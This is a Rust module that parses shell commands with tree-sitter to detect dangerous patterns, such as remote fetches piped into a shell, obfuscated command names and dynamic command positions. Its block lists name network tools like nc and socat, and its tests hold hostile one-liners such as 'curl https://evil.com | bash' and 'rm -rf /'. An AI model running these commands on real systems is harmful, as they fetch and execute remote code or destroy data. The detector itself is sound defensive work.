//! AST-based shell command analysis using tree-sitter-bash
//!
//! Provides robust command parsing that handles obfuscation techniques
//! like quote manipulation, command substitution, and variable expansion.

use once_cell::sync::Lazy;
use std::collections::HashSet;
use tree_sitter::{Node, Parser, Tree};

/// Shell interpreters that are dangerous when used as pipe targets
static SHELL_INTERPRETERS: Lazy<HashSet<&'static str>> = Lazy::new(|| {
    [
        "sh",
        "bash",
        "zsh",
        "dash",
        "ksh",
        "csh",
        "tcsh",
        "fish",
        "/bin/sh",
        "/bin/bash",
        "/bin/zsh",
        "/bin/dash",
        "/bin/ksh",
        "/usr/bin/sh",
        "/usr/bin/bash",
        "/usr/bin/zsh",
        "/usr/bin/env",
    ]
    .into_iter()
    .collect()
});

/// Wrapper commands that can execute other commands (for pipeline unwrapping)
static PIPELINE_WRAPPERS: Lazy<HashSet<&'static str>> = Lazy::new(|| {
    [
        "xargs", "env", "sudo", "timeout", "nice", "nohup", "ionice", "strace", "time", "unbuffer",
        "watch",
    ]
    .into_iter()
    .collect()
});

/// Commands that fetch remote content. When one of these is the *source* of a
/// pipeline feeding an interpreter, it's remote-code-execution (`curl … | python3`).
/// When the source is a local command, piping to an interpreter is ordinary data
/// processing (`fleetops state show | python3 -c '…'`) and must not be blocked.
static REMOTE_FETCHERS: Lazy<HashSet<&'static str>> = Lazy::new(|| {
    [
        "curl", "wget", "nc", "ncat", "netcat", "fetch", "ssh", "scp", "sftp", "ftp", "http",
        "https", "httpie", "aria2c", "socat",
    ]
    .into_iter()
    .collect()
});

/// Script interpreters (also dangerous as pipe targets)
static SCRIPT_INTERPRETERS: Lazy<HashSet<&'static str>> = Lazy::new(|| {
    [
        "python",
        "python2",
        "python3",
        "ruby",
        "perl",
        "node",
        "php",
        "/usr/bin/python",
        "/usr/bin/python3",
        "/usr/bin/ruby",
        "/usr/bin/perl",
        "/usr/bin/node",
    ]
    .into_iter()
    .collect()
});

/// Result of AST-based command analysis
#[derive(Debug, Clone)]
pub struct CommandAnalysis {
    /// All normalized command names found (handles quote obfuscation)
    pub commands: Vec<NormalizedCommand>,
    /// Whether any command position has dynamic execution (variable, substitution)
    pub has_dynamic_command: bool,
    /// Whether there's a pipeline to a shell interpreter
    pub has_pipe_to_shell: bool,
    /// Whether there's a pipeline to a script interpreter
    pub has_pipe_to_interpreter: bool,
    /// Whether a pipeline feeding an interpreter is sourced from remote content
    /// (`curl … | python3`). Distinguishes RCE from local data processing.
    pub pipe_source_is_remote: bool,
    /// Raw AST parse succeeded
    pub parsed: bool,
    /// Error message if parsing failed
    pub error: Option<String>,
}

/// A normalized command with its arguments
#[derive(Debug, Clone)]
pub struct NormalizedCommand {
    /// The normalized command name (quotes removed, concatenations resolved)
    pub name: String,
    /// The full command line for this command
    pub full_command: String,
    /// Whether the command name was dynamically generated
    pub is_dynamic: bool,
    /// Arguments to the command
    pub arguments: Vec<String>,
}

/// Parse and analyze a bash command using tree-sitter
pub fn analyze_command(source: &str) -> CommandAnalysis {
    let mut parser = Parser::new();

    // Set the bash language
    if parser
        .set_language(&tree_sitter_bash::LANGUAGE.into())
        .is_err()
    {
        return CommandAnalysis {
            commands: vec![],
            has_dynamic_command: false,
            has_pipe_to_shell: false,
            has_pipe_to_interpreter: false,
            pipe_source_is_remote: false,
            parsed: false,
            error: Some("Failed to load tree-sitter-bash language".to_string()),
        };
    }

    let tree = match parser.parse(source, None) {
        Some(t) => t,
        None => {
            return CommandAnalysis {
                commands: vec![],
                has_dynamic_command: false,
                has_pipe_to_shell: false,
                has_pipe_to_interpreter: false,
                pipe_source_is_remote: false,
                parsed: false,
                error: Some("Failed to parse command".to_string()),
            };
        }
    };

    analyze_tree(&tree, source)
}

/// Analyze the parsed AST tree
fn analyze_tree(tree: &Tree, source: &str) -> CommandAnalysis {
    let root = tree.root_node();

    // CRITICAL FIX: Check if the tree has parse errors
    // tree-sitter can return a partial tree with errors, which might miss dangerous patterns
    // If there are errors, mark as not parsed to trigger fallback regex checks
    if root.has_error() {
        return CommandAnalysis {
            commands: vec![],
            has_dynamic_command: false,
            has_pipe_to_shell: false,
            has_pipe_to_interpreter: false,
            pipe_source_is_remote: false,
            parsed: false,
            error: Some("AST contains parse errors - using fallback".to_string()),
        };
    }

    let mut commands = Vec::new();
    let mut has_dynamic_command = false;
    let mut has_pipe_to_shell = false;
    let mut has_pipe_to_interpreter = false;
    let mut pipe_source_is_remote = false;

    // Traverse all nodes looking for commands and pipelines
    collect_commands(&root, source, &mut commands, &mut has_dynamic_command);

    // Check for pipe to shell patterns
    check_pipelines(
        &root,
        source,
        &mut has_pipe_to_shell,
        &mut has_pipe_to_interpreter,
        &mut pipe_source_is_remote,
    );

    CommandAnalysis {
        commands,
        has_dynamic_command,
        has_pipe_to_shell,
        has_pipe_to_interpreter,
        pipe_source_is_remote,
        parsed: true,
        error: None,
    }
}

/// Recursively collect all commands from the AST
fn collect_commands(
    node: &Node,
    source: &str,
    commands: &mut Vec<NormalizedCommand>,
    has_dynamic: &mut bool,
) {
    match node.kind() {
        "command" => {
            if let Some(cmd) = extract_command(node, source) {
                if cmd.is_dynamic {
                    *has_dynamic = true;
                }
                commands.push(cmd);
            }
        }
        _ => {
            // Recurse into children
            let mut cursor = node.walk();
            for child in node.children(&mut cursor) {
                collect_commands(&child, source, commands, has_dynamic);
            }
        }
    }
}

/// Extract a normalized command from a command node
fn extract_command(node: &Node, source: &str) -> Option<NormalizedCommand> {
    let full_text = node.utf8_text(source.as_bytes()).ok()?;

    // Find the command_name child
    let mut cursor = node.walk();
    let mut command_name_node = None;
    let mut arguments = Vec::new();
    let mut in_args = false;

    for child in node.children(&mut cursor) {
        match child.kind() {
            "command_name" => {
                command_name_node = Some(child);
                in_args = true;
            }
            "word"
            | "string"
            | "raw_string"
            | "concatenation"
            | "simple_expansion"
            | "expansion"
            | "command_substitution"
                if in_args =>
            {
                if let Ok(text) = child.utf8_text(source.as_bytes()) {
                    arguments.push(normalize_word(&child, source));
                    let _ = text; // Silence warning
                }
            }
            _ => {}
        }
    }

    let command_name_node = command_name_node?;
    let (name, is_dynamic) = normalize_command_name(&command_name_node, source);

    Some(NormalizedCommand {
        name,
        full_command: full_text.to_string(),
        is_dynamic,
        arguments,
    })
}

/// Normalize a command name, handling quote obfuscation and detecting dynamic names
/// Returns (normalized_name, is_dynamic)
fn normalize_command_name(node: &Node, source: &str) -> (String, bool) {
    let mut cursor = node.walk();

    // Check the first child to determine what kind of command name this is
    if let Some(child) = node.children(&mut cursor).next() {
        match child.kind() {
            // Variable expansion in command position = dynamic
            "simple_expansion" | "expansion" => {
                let text = child.utf8_text(source.as_bytes()).unwrap_or("$?");
                return (text.to_string(), true);
            }
            // Command substitution in command position = dynamic
            "command_substitution" => {
                let text = child.utf8_text(source.as_bytes()).unwrap_or("$(...)");
                return (text.to_string(), true);
            }
            // Concatenation (like ba'sh') - normalize it
            "concatenation" => {
                let normalized = normalize_concatenation(&child, source);
                // Check if any part of the concatenation is dynamic
                let is_dynamic = has_dynamic_parts(&child, source);
                return (normalized, is_dynamic);
            }
            // Simple word
            "word" => {
                let text = child.utf8_text(source.as_bytes()).unwrap_or("");
                return (text.to_string(), false);
            }
            // Quoted string - remove quotes
            "string" | "raw_string" => {
                let text = child.utf8_text(source.as_bytes()).unwrap_or("");
                return (strip_quotes(text), false);
            }
            _ => {}
        }
    }

    // Fallback: use raw text
    let text = node.utf8_text(source.as_bytes()).unwrap_or("");
    (text.to_string(), false)
}

/// Normalize a concatenation node (like ba'sh' -> bash)
fn normalize_concatenation(node: &Node, source: &str) -> String {
    let mut result = String::new();
    let mut cursor = node.walk();

    for child in node.children(&mut cursor) {
        match child.kind() {
            "word" => {
                if let Ok(text) = child.utf8_text(source.as_bytes()) {
                    result.push_str(text);
                }
            }
            "string" | "raw_string" => {
                if let Ok(text) = child.utf8_text(source.as_bytes()) {
                    result.push_str(&strip_quotes(text));
                }
            }
            "simple_expansion" | "expansion" | "command_substitution" => {
                // Include as-is for pattern matching but mark as potentially dynamic
                if let Ok(text) = child.utf8_text(source.as_bytes()) {
                    result.push_str(text);
                }
            }
            // Recurse for nested concatenations
            "concatenation" => {
                result.push_str(&normalize_concatenation(&child, source));
            }
            _ => {
                if let Ok(text) = child.utf8_text(source.as_bytes()) {
                    result.push_str(text);
                }
            }
        }
    }

    result
}

/// Check if a node contains dynamic parts (variables, command substitution)
#[allow(clippy::only_used_in_recursion)]
fn has_dynamic_parts(node: &Node, source: &str) -> bool {
    match node.kind() {
        "simple_expansion" | "expansion" | "command_substitution" => true,
        _ => {
            let mut cursor = node.walk();
            for child in node.children(&mut cursor) {
                if has_dynamic_parts(&child, source) {
                    return true;
                }
            }
            false
        }
    }
}

/// Normalize a word (handles quoted strings, concatenations)
fn normalize_word(node: &Node, source: &str) -> String {
    match node.kind() {
        "concatenation" => normalize_concatenation(node, source),
        "string" | "raw_string" => {
            let text = node.utf8_text(source.as_bytes()).unwrap_or("");
            strip_quotes(text)
        }
        _ => node.utf8_text(source.as_bytes()).unwrap_or("").to_string(),
    }
}

/// Strip quotes from a string
fn strip_quotes(s: &str) -> String {
    let s = s.trim();
    if (s.starts_with('"') && s.ends_with('"')) || (s.starts_with('\'') && s.ends_with('\'')) {
        s[1..s.len() - 1].to_string()
    } else {
        s.to_string()
    }
}

/// Check for pipeline to shell patterns
fn check_pipelines(
    node: &Node,
    source: &str,
    has_pipe_to_shell: &mut bool,
    has_pipe_to_interpreter: &mut bool,
    pipe_source_is_remote: &mut bool,
) {
    if node.kind() == "pipeline" {
        // Get the commands in the pipeline
        let mut cursor = node.walk();
        let children: Vec<_> = node.children(&mut cursor).collect();

        // Find the last command (the pipe target)
        if let Some(last_cmd) = children.iter().rev().find(|c| c.kind() == "command") {
            if let Some(cmd) = extract_command(last_cmd, source) {
                // Check the command and its arguments for interpreters
                // This handles cases like: | xargs bash -c, | env sh, etc.
                check_command_for_interpreters(&cmd, has_pipe_to_shell, has_pipe_to_interpreter);
            }
        }

        // Find the first command (the pipe source). If it fetches remote content,
        // piping into an interpreter is RCE; otherwise it's local data processing.
        if let Some(first_cmd) = children.iter().find(|c| c.kind() == "command") {
            if let Some(cmd) = extract_command(first_cmd, source) {
                let name = cmd.name.to_lowercase();
                let base = name.rsplit('/').next().unwrap_or(&name);
                if REMOTE_FETCHERS.contains(base) {
                    *pipe_source_is_remote = true;
                }
            }
        }
    }

    // Recurse into children
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        check_pipelines(
            &child,
            source,
            has_pipe_to_shell,
            has_pipe_to_interpreter,
            pipe_source_is_remote,
        );
    }
}

/// Check a command (and its arguments) for shell/script interpreters
/// This handles wrappers like xargs, env, etc.
fn check_command_for_interpreters(
    cmd: &NormalizedCommand,
    has_pipe_to_shell: &mut bool,
    has_pipe_to_interpreter: &mut bool,
) {
    let normalized_name = cmd.name.to_lowercase();

    // Direct interpreter check
    if SHELL_INTERPRETERS.contains(normalized_name.as_str()) {
        *has_pipe_to_shell = true;
        return;
    }
    if SCRIPT_INTERPRETERS.contains(normalized_name.as_str()) {
        *has_pipe_to_interpreter = true;
        return;
    }

    // Check if this is a wrapper command
    // If so, check the arguments for interpreters
    if PIPELINE_WRAPPERS.contains(normalized_name.as_str()) && !cmd.arguments.is_empty() {
        // For wrapper commands, check all arguments for interpreter names
        // This catches: xargs bash, xargs sh -c, env bash, sudo bash, etc.
        for arg in &cmd.arguments {
            let arg_lower = arg.to_lowercase();
            // Skip flags
            if arg_lower.starts_with('-') {
                continue;
            }
            // Check if this argument is an interpreter
            if SHELL_INTERPRETERS.contains(arg_lower.as_str()) {
                *has_pipe_to_shell = true;
                return;
            }
            if SCRIPT_INTERPRETERS.contains(arg_lower.as_str()) {
                *has_pipe_to_interpreter = true;
                return;
            }
            // Also check for path-based interpreter names
            if arg_lower.ends_with("/sh")
                || arg_lower.ends_with("/bash")
                || arg_lower.ends_with("/zsh")
                || arg_lower.ends_with("/dash")
            {
                *has_pipe_to_shell = true;
                return;
            }
            if arg_lower.ends_with("/python")
                || arg_lower.ends_with("/python3")
                || arg_lower.ends_with("/ruby")
                || arg_lower.ends_with("/perl")
                || arg_lower.ends_with("/node")
            {
                *has_pipe_to_interpreter = true;
                return;
            }
        }
    }
}

/// Get all command names from an analysis (for pattern matching)
pub fn get_command_names(analysis: &CommandAnalysis) -> Vec<&str> {
    analysis.commands.iter().map(|c| c.name.as_str()).collect()
}

/// Check if any command matches a given name (case-insensitive)
pub fn has_command(analysis: &CommandAnalysis, name: &str) -> bool {
    let name_lower = name.to_lowercase();
    analysis.commands.iter().any(|c| {
        let cmd_name = c.name.to_lowercase();
        // Check exact match or path match (e.g., /bin/rm matches rm)
        cmd_name == name_lower || cmd_name.ends_with(&format!("/{}", name_lower))
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_simple_command() {
        let analysis = analyze_command("ls -la");
        assert!(analysis.parsed);
        assert_eq!(analysis.commands.len(), 1);
        assert_eq!(analysis.commands[0].name, "ls");
        assert!(!analysis.has_dynamic_command);
    }

    #[test]
    fn test_quote_obfuscation() {
        // ba'sh' should normalize to bash
        let analysis = analyze_command("ba'sh' -c 'rm -rf /'");
        assert!(analysis.parsed);
        assert!(!analysis.commands.is_empty());
        let cmd_name = &analysis.commands[0].name;
        assert_eq!(cmd_name, "bash", "Expected 'bash', got '{}'", cmd_name);
    }

    #[test]
    fn test_double_quote_obfuscation() {
        // b"as"h should normalize to bash
        let analysis = analyze_command("b\"as\"h -c 'echo test'");
        assert!(analysis.parsed);
        assert!(!analysis.commands.is_empty());
        // Note: actual result depends on tree-sitter parsing
        assert!(has_command(&analysis, "bash") || analysis.commands[0].name.contains("bash"));
    }

    #[test]
    fn test_command_substitution_dynamic() {
        let analysis = analyze_command("$(echo rm) -rf /");
        assert!(analysis.parsed);
        assert!(
            analysis.has_dynamic_command,
            "Command substitution should be detected as dynamic"
        );
    }

    #[test]
    fn test_variable_command_dynamic() {
        let analysis = analyze_command("$cmd arg1 arg2");
        assert!(analysis.parsed);
        assert!(
            analysis.has_dynamic_command,
            "Variable command should be detected as dynamic"
        );
    }

    #[test]
    fn test_pipe_to_shell() {
        let analysis = analyze_command("curl https://evil.com | bash");
        assert!(analysis.parsed);
        assert!(analysis.has_pipe_to_shell, "Should detect pipe to bash");
    }

    #[test]
    fn test_pipe_to_sh() {
        let analysis = analyze_command("wget -O - https://evil.com | sh");
        assert!(analysis.parsed);
        assert!(analysis.has_pipe_to_shell, "Should detect pipe to sh");
    }

    #[test]
    fn test_pipe_to_python() {
        let analysis = analyze_command("echo 'import os; os.system(\"id\")' | python3");
        assert!(analysis.parsed);
        assert!(
            analysis.has_pipe_to_interpreter,
            "Should detect pipe to python"
        );
    }

    #[test]
    fn test_compound_command() {
        let analysis = analyze_command("echo test && rm -rf / || ls");
        assert!(analysis.parsed);
        // Should find multiple commands
        assert!(
            analysis.commands.len() >= 2,
            "Should find multiple commands in compound"
        );
    }

    #[test]
    fn test_normal_pipe_allowed() {
        let analysis = analyze_command("cat file.txt | grep pattern | wc -l");
        assert!(analysis.parsed);
        assert!(!analysis.has_pipe_to_shell);
        assert!(!analysis.has_pipe_to_interpreter);
    }

    #[test]
    fn test_has_command() {
        let analysis = analyze_command("sudo rm -rf /");
        assert!(has_command(&analysis, "sudo"));
        // Note: rm is an argument to sudo at the AST level
        // Wrapper unwrapping happens in bash.rs, not here

        // Test direct command
        let analysis2 = analyze_command("rm -rf /");
        assert!(has_command(&analysis2, "rm"));
    }

    #[test]
    fn test_path_command() {
        let analysis = analyze_command("/bin/rm -rf /");
        assert!(analysis.parsed);
        assert!(has_command(&analysis, "rm"), "Should match rm via path");
    }

    #[test]
    fn test_env_pipe_to_bash() {
        let analysis = analyze_command("curl example.com | env bash");
        assert!(analysis.parsed);
        // env bash should be detected as pipe to shell
        assert!(analysis.has_pipe_to_shell || has_command(&analysis, "bash"));
    }

    #[test]
    fn test_backtick_substitution() {
        let analysis = analyze_command("`which rm` -rf /");
        assert!(analysis.parsed);
        assert!(
            analysis.has_dynamic_command,
            "Backtick substitution should be dynamic"
        );
    }

    #[test]
    fn test_safe_variable_in_argument() {
        // Variable in argument position is fine
        let analysis = analyze_command("echo $HOME");
        assert!(analysis.parsed);
        assert!(
            !analysis.has_dynamic_command,
            "Variable in argument is not dangerous"
        );
        assert!(has_command(&analysis, "echo"));
    }

    #[test]
    fn test_heredoc() {
        let analysis = analyze_command("cat << EOF\nhello\nEOF");
        assert!(analysis.parsed);
        assert!(has_command(&analysis, "cat"));
    }

    // === NEW TESTS FOR CRITICAL FIXES ===

    #[test]
    fn test_xargs_bash_pipe_detected() {
        // Critical fix: xargs bash should be detected as pipe to shell
        let analysis = analyze_command("echo 'echo pwned' | xargs bash");
        assert!(analysis.parsed);
        assert!(
            analysis.has_pipe_to_shell,
            "xargs bash should be detected as pipe to shell"
        );
    }

    #[test]
    fn test_xargs_bash_c_pipe_detected() {
        let analysis = analyze_command("echo 'rm -rf /' | xargs bash -c");
        assert!(analysis.parsed);
        assert!(
            analysis.has_pipe_to_shell,
            "xargs bash -c should be detected as pipe to shell"
        );
    }

    #[test]
    fn test_sudo_bash_pipe_detected() {
        let analysis = analyze_command("cat script.sh | sudo bash");
        assert!(analysis.parsed);
        assert!(
            analysis.has_pipe_to_shell,
            "sudo bash should be detected as pipe to shell"
        );
    }

    #[test]
    fn test_xargs_python_pipe_detected() {
        let analysis = analyze_command("echo 'import os' | xargs python3 -c");
        assert!(analysis.parsed);
        assert!(
            analysis.has_pipe_to_interpreter,
            "xargs python should be detected as pipe to interpreter"
        );
    }
}
